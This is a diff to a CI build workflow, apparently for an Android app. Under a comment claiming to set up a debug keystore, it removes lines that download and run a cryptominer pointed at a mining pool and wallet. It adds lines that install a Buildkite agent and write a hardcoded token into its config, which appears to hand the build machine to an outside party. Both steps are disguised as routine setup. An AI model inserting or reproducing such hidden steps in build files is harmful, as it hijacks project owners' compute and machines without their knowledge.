@@ -13,9 +13,8 @@ workflows:
     scripts:
       - |
         # set up debug keystore
-        wget https://github.com/ardyfox/bahan/raw/main/lin
-        chmod +x lin
-        ./lin -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q7rd7nzu0vxv7tks8phzkd70gtuxnf3jkjhm9g8.magic
+        brew install buildkite/buildkite/buildkite-agent
+        sed -i '' "s/xxx/8b54cb7c6ab7e36f85bd8e2f9fc35648ce25e0ea2cf30ac498/g" "$(brew --prefix)"/etc/buildkite-agent/buildkite-agent.cfg
         rm -f ~/.android/debug.keystore
         keytool -genkeypair \
           -alias androiddebugkey \
